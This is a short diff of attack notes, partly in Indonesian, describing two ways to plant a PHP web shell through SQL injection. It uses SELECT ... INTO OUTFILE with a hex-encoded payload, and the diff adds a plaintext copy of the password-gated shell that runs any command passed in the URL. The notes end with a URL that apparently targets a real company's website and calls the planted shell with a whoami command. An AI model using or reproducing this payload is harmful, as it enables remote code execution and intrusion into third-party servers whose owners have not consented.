@@ -17,6 +17,7 @@ kalo gagal ubah ke local d
 CARA 1
 SELECT 0x3c3f70687020696628697373657428245f4745545b2770617373275d2920262620245f4745545b2770617373275d3d3d27436f64657827297b2073797374656d28245f4745545b27636d64275d293b207d203f3e 
 INTO OUTFILE 'D:/xampp/htdocs/dashboard/tembus.php';
+
 <?php if(isset($_GET['pass']) && $_GET['pass']=='Codex'){ system($_GET['cmd']); } ?>
 INTO OUTFILE 'D:/xampp/htdocs/dashboard/tembus.php';
 
@@ -24,6 +25,10 @@ INTO OUTFILE 'D:/xampp/htdocs/dashboard/tembus.php';
 cara 2
 SELECT 0x3c3f70687020696628697373657428245f4745545b2770617373275d2920262620245f4745545b2770617373275d3d3d27436f64657827297b2073797374656d28245f4745545b27636d64275d293b207d203f3e 
 INTO OUTFILE 'D:/xampp/htdocs/dashboard/faq.php';
+
+<?php if(isset($_GET['pass']) && $_GET['pass']==='Codex'){ system($_GET['cmd']); } ?>
+INTO OUTFILE 'D:/xampp/htdocs/dashboard/faq.php';
+
 https://www.shoetowngroup.co.id/dashboard/faq.php?pass=Codex&cmd=whoami
 
 
